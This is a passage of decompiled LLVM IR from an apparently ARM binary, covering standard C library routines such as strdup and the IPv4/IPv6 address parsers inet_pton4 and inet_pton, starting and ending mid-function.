dec_label_pc_164e0:                               ; preds = %dec_label_pc_164c4
  %v2_164e0 = icmp eq i32 %v0_164e0, 0
  br i1 %v2_164e0, label %dec_label_pc_16500, label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164e0
  %v1_164e8 = add i32 %v0_164e8, 1
  store i32 %v1_164e8, i32* @lr, align 4
  %v1_164ec = add i32 %v0_164ec, 1
  %v1_164f0 = inttoptr i32 %v1_164ec to i8*
  %v2_164f0 = load i8, i8* %v1_164f0, align 1
  %v3_164f0 = zext i8 %v2_164f0 to i32
  store i32 %v3_164f0, i32* @r2, align 4
  %v2_164f4 = icmp eq i8 %v2_164f0, 0
  br i1 %v2_164f4, label %dec_label_pc_16500, label %dec_label_pc_164cc.preheader

dec_label_pc_164cc.preheader:                     ; preds = %entry, %dec_label_pc_164e8
  %v0_164ec = phi i32 [ %v1_164ec, %dec_label_pc_164e8 ], [ %v0_164f02, %entry ]
  %v0_164e8 = phi i32 [ %v1_164e8, %dec_label_pc_164e8 ], [ 0, %entry ]
  %v0_164e0 = phi i32 [ %v3_164f0, %dec_label_pc_164e8 ], [ %v3_164f05, %entry ]
  br label %dec_label_pc_164cc

dec_label_pc_16500:                               ; preds = %dec_label_pc_164e0, %dec_label_pc_164e8, %dec_label_pc_164cc, %entry
  %v0_16500 = phi i32 [ 0, %entry ], [ %v0_164e8, %dec_label_pc_164cc ], [ %v1_164e8, %dec_label_pc_164e8 ], [ %v0_164e8, %dec_label_pc_164e0 ]
  ret i32 %v0_16500

; uselistorder directives
  uselistorder i32 %v3_164cc, { 1, 0 }
  uselistorder i32 %v0_164d4, { 1, 0 }
  uselistorder label %dec_label_pc_16500, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_164cc.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_16508 = load i32, i32* @r4, align 4
  store i32 %v3_16508, i32* %stack_var_-12, align 4
  %v6_16508 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_16510 = call i32 @strlen(i8* %arg1)
  %v1_16514 = add i32 %v3_16510, 1
  store i32 %v1_16514, i32* @r4, align 4
  %v1_1651c = call i32 @malloc(i32 %v1_16514)
  store i32 91440, i32* @lr, align 4
  %v1_1652c = icmp ne i32 %v1_1651c, 0
  call void @__pseudo_cond_branch(i1 %v1_1652c, i32 ptrtoint ([3 x i8]* @global_var_11650.542 to i32))
  %v2_16534 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16534, i32* @r4, align 4
  store i32 %v6_16508, i32* @r5, align 4
  ret i32 %v1_1651c

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_16538 = load i32, i32* @r5, align 4
  %v2_16540 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_16540, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_165c83 = load i8, i8* %arg1, align 1
  %v3_165c84 = zext i8 %v2_165c83 to i32
  %v5_165c85 = add i32 %tmp, 1
  store i32 %v5_165c85, i32* @r4, align 4
  %v2_165cc6 = icmp eq i8 %v2_165c83, 0
  store i1 %v2_165cc6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_165cc6, label %dec_label_pc_165d8, label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %entry, %dec_label_pc_165c8.backedge
  %v0_165a4 = phi i32 [ %v3_165c8, %dec_label_pc_165c8.backedge ], [ %v3_165c84, %entry ]
  %v1_165d010.in = phi i32 [ %v3_165c8, %dec_label_pc_165c8.backedge ], [ %v3_165c84, %entry ]
  %v1_165d010 = add nsw i32 %v1_165d010.in, -48
  %v2_16560 = icmp ugt i32 %v1_165d010, 8
  %v7_16560 = icmp eq i32 %v1_165d010, 9
  store i1 %v7_16560, i1* %cpsr_z.global-to-local, align 1
  %v2_16568 = xor i1 %v7_16560, true
  %v3_16568 = and i1 %v2_16560, %v2_16568
  br i1 %v3_16568, label %dec_label_pc_165a4, label %dec_label_pc_1656c

dec_label_pc_1656c:                               ; preds = %dec_label_pc_16560
  %v0_1656c = load i32, i32* %r0.global-to-local, align 4
  %v1_1656c = inttoptr i32 %v0_1656c to i8*
  %v2_1656c = load i8, i8* %v1_1656c, align 1
  %v3_1656c = zext i8 %v2_1656c to i32
  %v3_16574 = mul nuw nsw i32 %v3_1656c, 10
  %v4_16574 = add nuw nsw i32 %v3_16574, %v0_165a4
  %v1_16578 = add nsw i32 %v4_16574, -48
  %v2_1657c = icmp ugt i32 %v1_16578, 254
  %v7_1657c = icmp eq i32 %v1_16578, 255
  store i1 %v7_1657c, i1* %cpsr_z.global-to-local, align 1
  %v2_16580 = xor i1 %v7_1657c, true
  %v3_16580 = and i1 %v2_1657c, %v2_16580
  br i1 %v3_16580, label %dec_label_pc_165fc, label %dec_label_pc_16584

dec_label_pc_16584:                               ; preds = %dec_label_pc_1656c
  %v0_16584 = load i32, i32* %r1.global-to-local, align 4
  %v2_16584 = icmp eq i32 %v0_16584, 0
  store i1 %v2_16584, i1* %cpsr_z.global-to-local, align 1
  %v1_16588 = trunc i32 %v1_16578 to i8
  store i8 %v1_16588, i8* %v1_1656c, align 1
  %v0_1658c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1658c, label %dec_label_pc_16590, label %dec_label_pc_165c8.backedge

dec_label_pc_16590:                               ; preds = %dec_label_pc_16584
  %v0_16590 = load i32, i32* @lr, align 4
  %v1_16590 = add i32 %v0_16590, 1
  store i32 %v1_16590, i32* @lr, align 4
  %v7_16594 = icmp eq i32 %v1_16590, 4
  store i1 %v7_16594, i1* %cpsr_z.global-to-local, align 1
  %v0_16598 = load i32, i32* %r1.global-to-local, align 4
  %v1_16598 = add i32 %v0_16598, 1
  store i32 %v1_16598, i32* %r1.global-to-local, align 4
  %v8_1659c = icmp sgt i32 %v1_16590, 4
  br i1 %v8_1659c, label %dec_label_pc_165fc, label %dec_label_pc_165c8.backedge

dec_label_pc_165a4:                               ; preds = %dec_label_pc_16560
  %v7_165a4 = icmp eq i32 %v0_165a4, 46
  store i1 %v7_165a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_165a4, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_165a4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_165fc

bb:                                               ; preds = %dec_label_pc_165a4
  %v1_165ac = load i32, i32* %r1.global-to-local, align 4
  %v2_165ac = urem i32 %v1_165ac, 2
  %v2_165b0 = icmp eq i32 %v2_165ac, 0
  store i1 %v2_165b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_165b0, label %dec_label_pc_165fc, label %dec_label_pc_165bc

dec_label_pc_165bc:                               ; preds = %bb
  %v0_165bc = load i32, i32* @lr, align 4
  %v7_165bc = icmp eq i32 %v0_165bc, 4
  store i1 %v7_165bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_165bc, label %dec_label_pc_165fc, label %dec_label_pc_165c4

dec_label_pc_165c4:                               ; preds = %dec_label_pc_165bc
  %v2_165c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_165c4 = add i32 %v2_165c4, 1
  %v4_165c4 = inttoptr i32 %v3_165c4 to i8*
  store i8 0, i8* %v4_165c4, align 1
  %v5_165c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_165c4 = add i32 %v5_165c4, 1
  store i32 %v6_165c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c8.backedge

dec_label_pc_165c8.backedge:                      ; preds = %dec_label_pc_165c4, %dec_label_pc_16584, %dec_label_pc_16590
  %v0_165c8 = load i32, i32* @r4, align 4
  %v1_165c8 = inttoptr i32 %v0_165c8 to i8*
  %v2_165c8 = load i8, i8* %v1_165c8, align 1
  %v3_165c8 = zext i8 %v2_165c8 to i32
  %v5_165c8 = add i32 %v0_165c8, 1
  store i32 %v5_165c8, i32* @r4, align 4
  %v2_165cc = icmp eq i8 %v2_165c8, 0
  store i1 %v2_165cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_165cc, label %dec_label_pc_165c8.dec_label_pc_165d8_crit_edge, label %dec_label_pc_16560

dec_label_pc_165c8.dec_label_pc_165d8_crit_edge:  ; preds = %dec_label_pc_165c8.backedge
  %v0_165d8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %dec_label_pc_165c8.dec_label_pc_165d8_crit_edge, %entry
  %v0_165d8 = phi i32 [ %v0_165d8.pre, %dec_label_pc_165c8.dec_label_pc_165d8_crit_edge ], [ 0, %entry ]
  %v7_165d8 = icmp eq i32 %v0_165d8, 3
  store i1 %v7_165d8, i1* %cpsr_z.global-to-local, align 1
  %v7_165dc = icmp slt i32 %v0_165d8, 4
  br i1 %v7_165dc, label %dec_label_pc_165fc, label %dec_label_pc_165e0

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165d8
  %v0_165e0 = load i32, i32* @r5, align 4
  store i32 %v0_165e0, i32* @r0, align 4
  store i32 %v2_16540, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_165ec = call i32 @memcpy()
  br label %dec_label_pc_165fc

dec_label_pc_165fc:                               ; preds = %dec_label_pc_1656c, %dec_label_pc_16590, %bb, %dec_label_pc_165bc, %.thread12, %dec_label_pc_165d8, %dec_label_pc_165e0
  %storemerge = phi i32 [ 1, %dec_label_pc_165e0 ], [ 0, %dec_label_pc_165d8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_165bc ], [ 0, %bb ], [ 0, %dec_label_pc_16590 ], [ 0, %dec_label_pc_1656c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_16538, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_165d8, { 1, 0 }
  uselistorder i32 %v3_165c8, { 1, 0 }
  uselistorder i32 %v0_165a4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_165fc, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_165c8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16560, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16604 = load i32, i32* @r4, align 4
  %v6_16604 = load i32, i32* @r5, align 4
  %v9_16604 = load i32, i32* @r6, align 4
  %v7_16608 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_16608, label %dec_label_pc_16628, label %dec_label_pc_1661c

dec_label_pc_1661c:                               ; preds = %entry
  %v7_1661c = icmp eq i32 %arg1, 10
  br i1 %v7_1661c, label %dec_label_pc_1663c, label %dec_label_pc_167ec

dec_label_pc_16628:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_16630 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_16630, i32* %r0.global-to-local, align 4
  store i32 %v4_16630, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16804

dec_label_pc_1663c:                               ; preds = %dec_label_pc_1661c
  %v2_1663c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1663c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_16648 = bitcast i32* %stack_var_-52 to i8*
  %v3_16648 = call i32 @__GI_memset(i8* %v2_16648, i32 0)
  store i32 %v3_16648, i32* %r0.global-to-local, align 4
  %v0_1664c = load i32, i32* @r6, align 4
  %v1_1664c = inttoptr i32 %v0_1664c to i8*
  %v2_1664c = load i8, i8* %v1_1664c, align 1
  %v3_1664c = zext i8 %v2_1664c to i32
  store i32 %v3_1664c, i32* %r3.global-to-local, align 4
  %v7_16650 = icmp eq i8 %v2_1664c, 58
  store i32 %v3_16648, i32* @r4, align 4
  %v2_16658 = add i32 %v3_16648, 16
  store i32 %v2_16658, i32* %r8.global-to-local, align 4
  br i1 %v7_16650, label %dec_label_pc_16660, label %dec_label_pc_1666c

dec_label_pc_16660:                               ; preds = %dec_label_pc_1663c
  %v1_16660 = add i32 %v0_1664c, 1
  %v2_16660 = inttoptr i32 %v1_16660 to i8*
  %v3_16660 = load i8, i8* %v2_16660, align 1
  %v4_16660 = zext i8 %v3_16660 to i32
  store i32 %v4_16660, i32* %r3.global-to-local, align 4
  store i32 %v1_16660, i32* @r6, align 4
  %v7_16664 = icmp eq i8 %v3_16660, 58
  br i1 %v7_16664, label %dec_label_pc_1666c, label %dec_label_pc_16800

dec_label_pc_1666c:                               ; preds = %dec_label_pc_16660, %dec_label_pc_1663c
  %v0_16670 = phi i32 [ %v1_16660, %dec_label_pc_16660 ], [ %v0_1664c, %dec_label_pc_1663c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_16670, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1674c7 = inttoptr i32 %v0_16670 to i8*
  %v2_1674c8 = load i8, i8* %v1_1674c7, align 1
  %v3_1674c9 = zext i8 %v2_1674c8 to i32
  store i32 %v3_1674c9, i32* %r0.global-to-local, align 4
  %v1_1675010 = call i32 @__GI_tolower(i32 %v3_1674c9)
  store i32 %v1_1675010, i32* %r0.global-to-local, align 4
  store i32 %v1_1675010, i32* @r5, align 4
  %v2_1675412 = icmp eq i32 %v1_1675010, 0
  br i1 %v2_1675412, label %dec_label_pc_1675c, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_1666c, %dec_label_pc_1674c.backedge
  %v0_16684 = phi i32 [ %v1_16750, %dec_label_pc_1674c.backedge ], [ %v1_1675010, %dec_label_pc_1666c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1674c.backedge ], [ 0, %dec_label_pc_1666c ]
  store i32 ptrtoint ([17 x i8]* @global_var_1af18.640 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1af18.640 to i32), i32* %r0.global-to-local, align 4
  %v3_1668c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1af18.640 to i32), i32 %v0_16684)
  %v4_1668c = trunc i32 %v3_1668c to i8
  store i32 %v3_1668c, i32* %r0.global-to-local, align 4
  %v3_16690 = icmp eq i8 %v4_1668c, 0
  %v0_16694 = load i32, i32* @r6, align 4
  %v1_16694 = add i32 %v0_16694, 1
  store i32 %v1_16694, i32* @r6, align 4
  br i1 %v3_16690, label %dec_label_pc_166b0, label %dec_label_pc_1669c

dec_label_pc_1669c:                               ; preds = %dec_label_pc_16680
  %v0_1669c = load i32, i32* %sb.global-to-local, align 4
  %v2_1669c = sext i8 %v4_1668c to i32
  %v3_1669c = sub i32 %v2_1669c, %v0_1669c
  store i32 %v3_1669c, i32* %r3.global-to-local, align 4
  %v1_166a0 = load i32, i32* %r7.global-to-local, align 4
  %v4_166a0 = mul i32 %v1_166a0, 16
  %v5_166a0 = or i32 %v4_166a0, %v3_1669c
  store i32 %v5_166a0, i32* %r7.global-to-local, align 4
  %v3_166a8 = icmp ult i32 %v5_166a0, 65534
  br i1 %v3_166a8, label %dec_label_pc_16744, label %dec_label_pc_16800

dec_label_pc_166b0:                               ; preds = %dec_label_pc_16680
  %v0_166b0 = load i32, i32* @r5, align 4
  %v7_166b0 = icmp eq i32 %v0_166b0, 58
  br i1 %v7_166b0, label %dec_label_pc_166b8, label %dec_label_pc_16714

dec_label_pc_166b8:                               ; preds = %dec_label_pc_166b0
  %v4_166b82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_166b82, i32* %r3.global-to-local, align 4
  %v2_166bc = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_166bc, label %dec_label_pc_166c4, label %dec_label_pc_166d8

dec_label_pc_166c4:                               ; preds = %dec_label_pc_166b8
  %v0_166c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_166c4 = icmp eq i32 %v0_166c4, 0
  br i1 %v2_166c4, label %dec_label_pc_166cc, label %dec_label_pc_16800

dec_label_pc_166cc:                               ; preds = %dec_label_pc_166c4
  %v0_166cc = load i32, i32* @r4, align 4
  store i32 %v0_166cc, i32* %fp.global-to-local, align 4
  store i32 %v1_16694, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1674c.backedge

dec_label_pc_166d8:                               ; preds = %dec_label_pc_166b8
  %v1_166d8 = inttoptr i32 %v1_16694 to i8*
  %v2_166d8 = load i8, i8* %v1_166d8, align 1
  %v3_166d8 = zext i8 %v2_166d8 to i32
  store i32 %v3_166d8, i32* %r3.global-to-local, align 4
  %v2_166dc = icmp eq i8 %v2_166d8, 0
  br i1 %v2_166dc, label %dec_label_pc_16800, label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %dec_label_pc_166d8
  %v0_166e4 = load i32, i32* @r4, align 4
  %v1_166e4 = add i32 %v0_166e4, 2
  store i32 %v1_166e4, i32* %r3.global-to-local, align 4
  %v1_166e8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_166e4, %v1_166e8
  br i1 %tmp38, label %dec_label_pc_16800, label %dec_label_pc_166f0

dec_label_pc_166f0:                               ; preds = %dec_label_pc_166e4
  %v0_166f0 = load i32, i32* %r7.global-to-local, align 4
  %v3_166f0 = udiv i32 %v0_166f0, 256
  store i32 %v3_166f0, i32* %r2.global-to-local, align 4
  store i32 %v0_166e4, i32* %r3.global-to-local, align 4
  %v1_166f8 = trunc i32 %v3_166f0 to i8
  %v3_166f8 = inttoptr i32 %v0_166e4 to i8*
  store i8 %v1_166f8, i8* %v3_166f8, align 1
  %v4_166f8 = load i32, i32* %r3.global-to-local, align 4
  %v5_166f8 = add i32 %v4_166f8, 1
  store i32 %v5_166f8, i32* %r3.global-to-local, align 4
  %v0_166fc = load i32, i32* @r6, align 4
  store i32 %v0_166fc, i32* %sl.global-to-local, align 4
  %v0_16700 = load i32, i32* %r7.global-to-local, align 4
  %v1_16700 = trunc i32 %v0_16700 to i8
  %v2_16700 = load i32, i32* @r4, align 4
  %v3_16700 = add i32 %v2_16700, 1
  %v4_16700 = inttoptr i32 %v3_16700 to i8*
  store i8 %v1_16700, i8* %v4_16700, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16708 = load i32, i32* %r3.global-to-local, align 4
  %v1_16708 = add i32 %v0_16708, 1
  store i32 %v1_16708, i32* @r4, align 4
  %v0_1674c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1674c.backedge

dec_label_pc_16714:                               ; preds = %dec_label_pc_166b0
  %v7_16714 = icmp eq i32 %v0_166b0, 46
  br i1 %v7_16714, label %dec_label_pc_1671c, label %dec_label_pc_16800

dec_label_pc_1671c:                               ; preds = %dec_label_pc_16714
  %v0_1671c = load i32, i32* @r4, align 4
  %v1_1671c = add i32 %v0_1671c, 4
  store i32 %v1_1671c, i32* @r5, align 4
  %v1_16720 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1671c, %v1_16720
  br i1 %tmp39, label %dec_label_pc_16800, label %dec_label_pc_16728

dec_label_pc_16728:                               ; preds = %dec_label_pc_1671c
  %v0_1672c = load i32, i32* %sl.global-to-local, align 4
  %v1_1672c = inttoptr i32 %v0_1672c to i8*
  store i32 %v0_1672c, i32* %r0.global-to-local, align 4
  %v4_16730 = call i32 @inet_pton4(i8* %v1_1672c, i32 %v0_1671c)
  store i32 %v4_16730, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_16730, 1
  br i1 %tmp36, label %dec_label_pc_16800, label %bb

bb:                                               ; preds = %dec_label_pc_16728
  %v5_16738 = load i32, i32* @r5, align 4
  store i32 %v5_16738, i32* @r4, align 4
  br label %dec_label_pc_16788

dec_label_pc_16744:                               ; preds = %dec_label_pc_1669c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1674c.backedge

dec_label_pc_1674c.backedge:                      ; preds = %dec_label_pc_16744, %dec_label_pc_166cc, %dec_label_pc_166f0
  %v0_1674c = phi i32 [ %v1_16694, %dec_label_pc_166cc ], [ %v0_1674c.pre, %dec_label_pc_166f0 ], [ %v1_16694, %dec_label_pc_16744 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_166cc ], [ 0, %dec_label_pc_166f0 ], [ 1, %dec_label_pc_16744 ]
  %v1_1674c = inttoptr i32 %v0_1674c to i8*
  %v2_1674c = load i8, i8* %v1_1674c, align 1
  %v3_1674c = zext i8 %v2_1674c to i32
  store i32 %v3_1674c, i32* %r0.global-to-local, align 4
  %v1_16750 = call i32 @__GI_tolower(i32 %v3_1674c)
  store i32 %v1_16750, i32* %r0.global-to-local, align 4
  store i32 %v1_16750, i32* @r5, align 4
  %v2_16754 = icmp eq i32 %v1_16750, 0
  br i1 %v2_16754, label %dec_label_pc_1675c, label %dec_label_pc_16680

dec_label_pc_1675c:                               ; preds = %dec_label_pc_1674c.backedge, %dec_label_pc_1666c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1666c ], [ %stack_var_-56.0.be, %dec_label_pc_1674c.backedge ]
  %v4_1675c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1675c3, i32* %r3.global-to-local, align 4
  %v2_16760 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_167cc.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_16760, label %dec_label_pc_16788, label %dec_label_pc_16768

dec_label_pc_16768:                               ; preds = %dec_label_pc_1675c
  %v1_16768 = add i32 %v0_167cc.pre.pre, 2
  store i32 %v1_16768, i32* %r3.global-to-local, align 4
  %v1_1676c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_16768, %v1_1676c
  br i1 %tmp40, label %dec_label_pc_16800, label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_16768
  store i32 %v0_167cc.pre.pre, i32* %r3.global-to-local, align 4
  %v0_16778 = load i32, i32* %r7.global-to-local, align 4
  %v3_16778 = udiv i32 %v0_16778, 256
  store i32 %v3_16778, i32* %r2.global-to-local, align 4
  %v1_1677c = trunc i32 %v3_16778 to i8
  %v3_1677c = inttoptr i32 %v0_167cc.pre.pre to i8*
  store i8 %v1_1677c, i8* %v3_1677c, align 1
  %v4_1677c = load i32, i32* %r3.global-to-local, align 4
  %v5_1677c = add i32 %v4_1677c, 1
  store i32 %v5_1677c, i32* %r3.global-to-local, align 4
  %v0_16780 = load i32, i32* %r7.global-to-local, align 4
  %v1_16780 = trunc i32 %v0_16780 to i8
  %v2_16780 = load i32, i32* @r4, align 4
  %v3_16780 = add i32 %v2_16780, 1
  %v4_16780 = inttoptr i32 %v3_16780 to i8*
  store i8 %v1_16780, i8* %v4_16780, align 1
  %v0_16784 = load i32, i32* %r3.global-to-local, align 4
  %v1_16784 = add i32 %v0_16784, 1
  store i32 %v1_16784, i32* @r4, align 4
  br label %dec_label_pc_16788

dec_label_pc_16788:                               ; preds = %dec_label_pc_1675c, %bb, %dec_label_pc_16774
  %v0_167cc.pre = phi i32 [ %v5_16738, %bb ], [ %v1_16784, %dec_label_pc_16774 ], [ %v0_167cc.pre.pre, %dec_label_pc_1675c ]
  %v0_16788 = load i32, i32* %fp.global-to-local, align 4
  %v2_16788 = icmp eq i32 %v0_16788, 0
  %v1_167cc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_16788, label %dec_label_pc_167cc, label %dec_label_pc_16790

dec_label_pc_16790:                               ; preds = %dec_label_pc_16788
  %v9_16790 = icmp eq i32 %v0_167cc.pre, %v1_167cc.pre
  %v2_16794 = sub i32 %v0_167cc.pre, %v0_16788
  store i32 %v2_16794, i32* %r0.global-to-local, align 4
  br i1 %v9_16790, label %dec_label_pc_16800, label %dec_label_pc_167b4.preheader

dec_label_pc_167b4.preheader:                     ; preds = %dec_label_pc_16790
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167a4:                               ; preds = %dec_label_pc_167b4
  %v0_167a4 = load i32, i32* %fp.global-to-local, align 4
  %v2_167a4 = add i32 %v0_167a4, %v2_167b8
  %v3_167a4 = inttoptr i32 %v2_167a4 to i8*
  %v4_167a4 = load i8, i8* %v3_167a4, align 1
  %v3_167a8 = inttoptr i32 %v2_167bc to i8*
  store i8 %v4_167a4, i8* %v3_167a8, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_167b0 = load i32, i32* %fp.global-to-local, align 4
  %v3_167b0 = load i32, i32* %ip.global-to-local, align 4
  %v4_167b0 = add i32 %v3_167b0, %v2_167b0
  %v5_167b0 = inttoptr i32 %v4_167b0 to i8*
  store i8 0, i8* %v5_167b0, align 1
  %v0_167b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_167b4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_167bc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %dec_label_pc_167b4.preheader, %dec_label_pc_167a4
  %v0_167c8 = phi i32 [ %v1_167cc.pre, %dec_label_pc_167b4.preheader ], [ %v1_167bc.pre, %dec_label_pc_167a4 ]
  %v1_167b8 = phi i32 [ %v2_16794, %dec_label_pc_167b4.preheader ], [ %v1_167b4.pre, %dec_label_pc_167a4 ]
  %v0_167c0 = phi i32 [ 1, %dec_label_pc_167b4.preheader ], [ %v0_167b4.pre, %dec_label_pc_167a4 ]
  %v2_167b8 = sub i32 %v1_167b8, %v0_167c0
  store i32 %v2_167b8, i32* %ip.global-to-local, align 4
  %v2_167bc = sub i32 %v0_167c8, %v0_167c0
  store i32 %v2_167bc, i32* @lr, align 4
  %v1_167c0 = add i32 %v0_167c0, 1
  store i32 %v1_167c0, i32* %r2.global-to-local, align 4
  %v7_167c4 = icmp slt i32 %v1_167b8, %v0_167c0
  br i1 %v7_167c4, label %dec_label_pc_167c8, label %dec_label_pc_167a4

dec_label_pc_167c8:                               ; preds = %dec_label_pc_167b4
  store i32 %v0_167c8, i32* @r4, align 4
  br label %dec_label_pc_167cc

dec_label_pc_167cc:                               ; preds = %dec_label_pc_16788, %dec_label_pc_167c8
  %v0_167cc = phi i32 [ %v0_167c8, %dec_label_pc_167c8 ], [ %v0_167cc.pre, %dec_label_pc_16788 ]
  %v1_167cc = phi i32 [ %v0_167c8, %dec_label_pc_167c8 ], [ %v1_167cc.pre, %dec_label_pc_16788 ]
  %v9_167cc = icmp eq i32 %v0_167cc, %v1_167cc
  br i1 %v9_167cc, label %dec_label_pc_167d4, label %dec_label_pc_16800

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167cc
  store i32 16, i32* @r2, align 4
  %v2_167d8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_167d8, i32* @r0, align 4
  store i32 %v2_1663c, i32* @r1, align 4
  %v0_167e0 = call i32 @memcpy()
  store i32 %v0_167e0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16804

dec_label_pc_167ec:                               ; preds = %dec_label_pc_1661c
  %v0_167ec = call i32 @__errno_location()
  store i32 %v0_167ec, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_167f8 = inttoptr i32 %v0_167ec to i32*
  store i32 97, i32* %v2_167f8, align 4
  %v0_16804.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16804

dec_label_pc_16800:                               ; preds = %dec_label_pc_1669c, %dec_label_pc_166c4, %dec_label_pc_166e4, %dec_label_pc_166d8, %dec_label_pc_16728, %dec_label_pc_16790, %dec_label_pc_16714, %dec_label_pc_167cc, %dec_label_pc_16660, %dec_label_pc_16768, %dec_label_pc_1671c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16804

